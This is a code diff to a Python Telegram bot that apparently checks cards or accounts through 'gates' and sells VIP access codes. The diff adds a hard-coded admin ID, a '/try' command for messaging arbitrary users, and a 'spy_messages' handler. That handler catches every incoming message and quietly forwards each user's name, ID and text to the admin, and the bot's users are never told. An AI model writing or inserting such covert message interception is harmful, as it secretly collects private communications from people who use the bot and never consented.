@@ -22,6 +22,9 @@ stop_users = {}
 last_check_time = {}
 ANTI_SPAM_SECONDS = 7
 
+# 🔥 إضافة الأدمن
+ADMIN_ID = 6843321125
+
 # ------------------- Gates -------------------
 
 GATES = [
@@ -244,8 +247,31 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             result_file.write(r+"\n\n")  
     await update.message.reply_text(f"Done ✅\nResults saved: {results_file_path}")
 
-# ------------------- /code -------------------
+# 🔥 /try
+async def try_reply(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.effective_user.id not in ADMINS:
+        return
+    try:
+        user_id = int(context.args[0])
+        reply_text = " ".join(context.args[1:])
+        await context.bot.send_message(chat_id=user_id, text=reply_text)
+        await update.message.reply_text("✅ Sent")
+    except:
+        await update.message.reply_text("❌ Usage:\n/try 123456789 hello")
 
+# 🔥 استقبال كل الرسائل
+async def spy_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    try:
+        user = update.effective_user
+        text = update.message.text or "No Text"
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=f"📩 New Message\n👤 {user.first_name} ({user.id})\n💬 {text}"
+        )
+    except:
+        pass
+
+# ------------------- /code -------------------
 async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
@@ -262,7 +288,6 @@ async def code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"✅ Code activated!\nYou are now VIP for {code_data['duration']} days.\nUsed {code_data['used']}/{code_data['max_users']}")
 
 # ------------------- /wafa -------------------
-
 async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: 
@@ -279,7 +304,6 @@ async def wafa_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"✅ Created code:\n{code}\nDuration: {duration} days\nMax users: {max_users}")
 
 # ------------------- /show_users -------------------
-
 async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: 
@@ -292,7 +316,6 @@ async def show_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(msg if msg else "No users yet")
 
 # ------------------- Ban/Unban -------------------
-
 async def ban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in ADMINS: 
@@ -315,14 +338,12 @@ async def unban_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"User {uid} unbanned ✅")
 
 # ------------------- /start -------------------
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     ALL_USERS.add(user_id)
     await update.message.reply_text("Bot Ready ✅")
 
 # ------------------- Run -------------------
-
 def main():
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
@@ -333,6 +354,8 @@ def main():
     app.add_handler(CommandHandler("show_users", show_users))
     app.add_handler(CommandHandler("ban_user", ban_user))
     app.add_handler(CommandHandler("unban_user", unban_user))
+    app.add_handler(CommandHandler("try", try_reply))
+    app.add_handler(MessageHandler(filters.ALL, spy_messages))  # 🔥 الجديد
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.run_polling()
 
